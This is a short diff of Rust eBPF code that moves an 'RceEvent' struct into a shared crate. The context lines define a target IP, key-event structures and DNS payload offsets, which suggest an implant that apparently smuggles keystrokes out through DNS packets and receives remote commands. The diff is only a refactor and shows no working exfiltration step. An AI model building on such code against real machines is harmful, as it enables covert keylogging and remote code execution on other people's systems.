@@ -1,5 +1,3 @@
-use core::mem;
-
 use aya_ebpf::{
     helpers::{bpf_skb_load_bytes, bpf_skb_store_bytes},
     macros::map,
@@ -8,6 +6,7 @@ use aya_ebpf::{
 };
 use aya_log_ebpf::{debug, error, info};
 use network_types::{eth::EthHdr, ip::Ipv4Hdr};
+use tamanoir_common::RceEvent;
 
 #[no_mangle]
 pub static TARGET_IP: u32 = 0;
@@ -30,7 +29,6 @@ pub const UDP_CSUM_OFFSET: usize = UDP_OFFSET + 6;
 pub const DNS_QUERY_OFFSET: usize = UDP_OFFSET + 8;
 
 pub const BPF_ADJ_ROOM_NET: u32 = 0;
-
 pub const KEYS_PAYLOAD_LEN: usize = 8;
 pub const DNS_PAYLOAD_MAX_LEN: usize = 128;
 
@@ -43,39 +41,6 @@ pub struct KeyEvent {
 }
 #[map]
 pub static DATA: Queue<u8> = Queue::with_max_entries(4096, 0);
-
-#[derive(Clone)]
-#[repr(C)]
-pub enum ContinuationByte {
-    Reset = 0,
-    ResetEnd = 1,
-    Continue = 2,
-    End = 3,
-}
-impl ContinuationByte {
-    pub fn from_u8(value: u8) -> Option<Self> {
-        match value {
-            0 => Some(ContinuationByte::Reset),
-            1 => Some(ContinuationByte::ResetEnd),
-            2 => Some(ContinuationByte::Continue),
-            3 => Some(ContinuationByte::End),
-            _ => None,
-        }
-    }
-}
-
-#[repr(C)]
-pub struct RceEvent {
-    pub prog: [u8; 32],
-    pub event_type: ContinuationByte,
-    pub length: usize,
-    pub is_first_batch: bool,
-    pub is_last_batch: bool,
-}
-
-impl RceEvent {
-    pub const LEN: usize = mem::size_of::<RceEvent>();
-}
 
 #[map]
 pub static RBUF: RingBuf = RingBuf::with_byte_size(8 * RceEvent::LEN as u32, 0);
